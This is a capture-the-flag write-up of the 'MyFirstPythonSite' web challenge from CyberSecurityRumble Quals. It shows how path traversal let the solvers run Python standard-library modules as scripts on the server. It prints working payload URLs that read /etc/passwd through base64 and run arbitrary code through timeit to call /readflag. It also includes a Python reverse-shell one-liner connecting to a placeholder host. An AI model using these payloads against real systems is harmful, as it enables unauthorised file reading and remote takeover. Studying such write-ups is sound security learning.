---
title: "MyFirstPythonSite - CyberSecurityRumble Quals"
category: "pwn"
subcategory: "lfi"
type: "writeup"
tags: ["pwn", "python", "path-traversal", "base64", "subprocess", "myfirstpythonsite", "lfi", "cybersecurityrumble-quals", "ctf-writeup"]
summary: "A web challenge by lukas2511 , solved by Euph0r14, Danptr, Svido, nikgame33"
source:
  name: "CTFtime writeup #39484"
  url: "https://ctftime.org/writeup/39484"
original_source: "https://pwn-la-chapelle.eu/posts/csr2024_myfirstpythonsite/"
ctf:
  name: "CyberSecurityRumble Quals"
  challenge: "MyFirstPythonSite"
---

## Metadata

- **CTF:** CyberSecurityRumble Quals
- **Task:** MyFirstPythonSite
- **Author team:** Pwn-la-Chapelle
- **CTFtime tags:** python
- **CTFtime:** <https://ctftime.org/writeup/39484>
- **Original writeup:** <https://pwn-la-chapelle.eu/posts/csr2024_myfirstpythonsite/>

---
A web challenge by **lukas2511** , solved by **Euph0r14, Danptr, Svido, nikgame33**

## Challenge

> I’ve heard PHP is insecure, so I started writing my first website in Python instead!

We get a website available at `https://myfirstpythonsite.rumble.host/?p=home`. It links to:

  * Homepage with a link to art and guestbook.
  * Art which openend jpg files.
  * Guestbook that gave a simple field to add an post


Source code was not given.

## Exploration

Art seemed interesting but we did not really look into it, as guestbook appeared more promising. We noticed that an entry can be added using `https://myfirstpythonsite.rumble.host/?p=guestbook&o=add&n=a&t=b`.

When typing accessing `https://myfirstpythonsite.rumble.host/?p=guestbook&h=""` however we are met with this help page, which looks suspicously like a CLI.

![Screenshot showing help page](https://pwn-la-chapelle.eu/posts/csr2024_myfirstpythonsite/helppage.png?raw=true)

## On the hunt

We tried many different possible approaches, such as bash escaping and argument injection but did not really find anything. We also tried the classic directory traversal “../” which lead to something fun! The error message changed when looking at existing python modules that couldn’t be correctly run so we looked for something that gives us output and is always there - Hello world! `https://myfirstpythonsite.rumble.host/?p=../../../../../../../../../../usr/lib/python3.11/__hello__` Now that we knew that we are on the right path we went to check out more of the python library, doing a quick `rgrep -e "**main**"` in our local python lib, which led to us finding multiple interesting libraries including Zipfiles, base64 and timeit!

Base64 allowed us to read/ exfiltrate files: `https://myfirstpythonsite.rumble.host/?p=../../../../../../../../../../lib/python3.11/base64&-e&/etc/passwd` This gave us the passwd and let us know that an app user exists. But we still had no clue where the app’s files were and we didn’t have a way to enumerate directories.

## Exploitation

So here comes the gamechanger **timeit** which normally allows us to time the execution of code - but also allows us to pass it arbitrary python statements to run! This was used to execute the command with the given URL parameters, giving us RCE. Hello to our “Shell”: `https://myfirstpythonsite.rumble.host/?p=../../../../../../../../../../lib/python3.11/timeit&-n&1&-s&import%20os;%20print(os.listdir())`

using base64 to grab files and listdir to move through the system we found out that the site had no way to the flag. `https://myfirstpythonsite.rumble.host/?p=../../../../../../../../../../lib/python3.11/timeit&-n&1&-s&import%20os;%20print(os.listdir(%22/%22))` gave us the final clue readflag and flag resulting in a final: `https://myfirstpythonsite.rumble.host/?p=../../../../../../../../../../lib/python3.11/timeit&-n&1&-s&import%20subprocess;%20print(subprocess.check_output(%27/readflag%27))`

![Flag](https://pwn-la-chapelle.eu/posts/csr2024_myfirstpythonsite/flag.png?raw=true)

Simultaneously we also tried out: `https://myfirstpythonsite.rumble.host/?p=../../../../../../../../../../lib/python3.11/timeit&s=import%20pty;import%20socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY-IP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")` which would have given us a stable remote shell using subprocess, but would have required some more fiddling!

And there we had it! Many failed attempts and a good bit of frustraion but in the end it felt amazing to finally find the Flag.
